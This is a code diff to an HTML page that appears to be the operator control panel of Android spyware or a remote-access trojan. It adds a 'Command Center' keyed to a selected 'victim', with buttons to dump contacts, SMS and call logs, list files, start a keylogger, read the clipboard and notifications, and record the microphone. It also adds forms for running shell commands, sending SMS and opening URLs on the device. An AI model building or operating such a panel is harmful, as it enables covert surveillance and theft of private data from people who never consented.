@@ -117,18 +117,95 @@
         </div>
 
 
-        <!-- Command Center -->
-        <div id="cmdcernter" role="region" aria-label="Command center">
-            <input type="text" id="cmdref" placeholder="cmdref" value="/comds/comdsdc38kw6i" aria-label="Command reference">
-            <br>
-            <input type="text" id="cmd" placeholder="cmd type" aria-label="Command type">
-            <br>
-            <input type="text" id="cmdvar" placeholder="cmm" aria-label="Command variable">
-            <br>
-            <input type="text" id="cmdvarm" placeholder="cmd var optional" aria-label="Command variable optional">
-            <br>
-            <button onclick="cmd()" aria-label="Send command">Send</button>
-            <br>
+        <!-- Enhanced Command Center -->
+        <div id="command-center" class="command-center" role="region" aria-label="Command center">
+            <div class="command-header">
+                <h3>🎮 Command Center</h3>
+                <div class="command-status">
+                    <span id="selected-victim-status">No victim selected</span>
+                </div>
+            </div>
+
+            <!-- Quick Commands Panel -->
+            <div class="quick-commands">
+                <h4>⚡ Quick Commands</h4>
+                <div class="command-grid">
+                    <button class="cmd-btn primary" onclick="sendQuickCommand('get_device_info')" title="Get device information">
+                        📱 Device Info
+                    </button>
+                    <button class="cmd-btn primary" onclick="sendQuickCommand('dump_contacts')" title="Dump contacts">
+                        👥 Contacts
+                    </button>
+                    <button class="cmd-btn primary" onclick="sendQuickCommand('dump_sms')" title="Dump SMS messages">
+                        💬 SMS
+                    </button>
+                    <button class="cmd-btn primary" onclick="sendQuickCommand('dump_call_logs')" title="Dump call logs">
+                        📞 Call Logs
+                    </button>
+                    <button class="cmd-btn primary" onclick="sendQuickCommand('list_files')" title="List files">
+                        📁 Files
+                    </button>
+                    <button class="cmd-btn primary" onclick="sendQuickCommand('get_installed_apps')" title="Get installed apps">
+                        📦 Apps
+                    </button>
+                    <button class="cmd-btn secondary" onclick="sendQuickCommand('start_keylogger')" title="Start keylogger">
+                        ⌨️ Keylogger
+                    </button>
+                    <button class="cmd-btn secondary" onclick="sendQuickCommand('get_clipboard')" title="Get clipboard">
+                        📋 Clipboard
+                    </button>
+                    <button class="cmd-btn secondary" onclick="sendQuickCommand('start_recording')" title="Start microphone recording">
+                        🎤 Record
+                    </button>
+                    <button class="cmd-btn secondary" onclick="sendQuickCommand('get_notifications')" title="Get notifications">
+                        🔔 Notifications
+                    </button>
+                    <button class="cmd-btn danger" onclick="sendQuickCommand('vibrate')" title="Vibrate device">
+                        📳 Vibrate
+                    </button>
+                    <button class="cmd-btn danger" onclick="sendQuickCommand('play_music')" title="Play music">
+                        🎵 Music
+                    </button>
+                </div>
+            </div>
+
+            <!-- Custom Command Panel -->
+            <div class="custom-commands">
+                <h4>🔧 Custom Commands</h4>
+                <div class="command-form">
+                    <div class="form-group">
+                        <label for="custom-cmd-type">Command Type:</label>
+                        <select id="custom-cmd-type" class="cmd-input">
+                            <option value="shell_command">Shell Command</option>
+                            <option value="send_sms">Send SMS</option>
+                            <option value="launch_url">Launch URL</option>
+                            <option value="change_wallpaper">Change Wallpaper</option>
+                            <option value="custom_command">Custom Command</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="custom-cmd-param">Parameters:</label>
+                        <input type="text" id="custom-cmd-param" class="cmd-input" placeholder="Enter command parameters...">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="custom-cmd-extra">Extra Data (optional):</label>
+                        <input type="text" id="custom-cmd-extra" class="cmd-input" placeholder="Additional data...">
+                    </div>
+
+                    <button class="cmd-btn success" onclick="sendCustomCommand()">🚀 Send Command</button>
+                </div>
+            </div>
+
+            <!-- Command History -->
+            <div class="command-history">
+                <h4>📋 Command History</h4>
+                <div id="command-log" class="command-log">
+                    <div class="log-entry info">Command history will appear here...</div>
+                </div>
+                <button class="cmd-btn info" onclick="clearCommandHistory()">🗑️ Clear History</button>
+            </div>
         </div>
 
         <!-- Response Area -->
@@ -138,8 +215,8 @@
         <div id="fprev" role="region" aria-label="File preview">
             <h4>Preview</h4>
             <br>
-            <img id="imv" src="img3.png" alt="Preview Image">
-            <iframe id="imv2" src="img3.png" title="File Preview"></iframe>
+            <img id="imv" src="./img/img3.png" alt="Preview Image">
+            <iframe id="imv2" src="./img/img3.png" title="File Preview"></iframe>
             <br>
             <hr>
             <ul id="fprevdes">
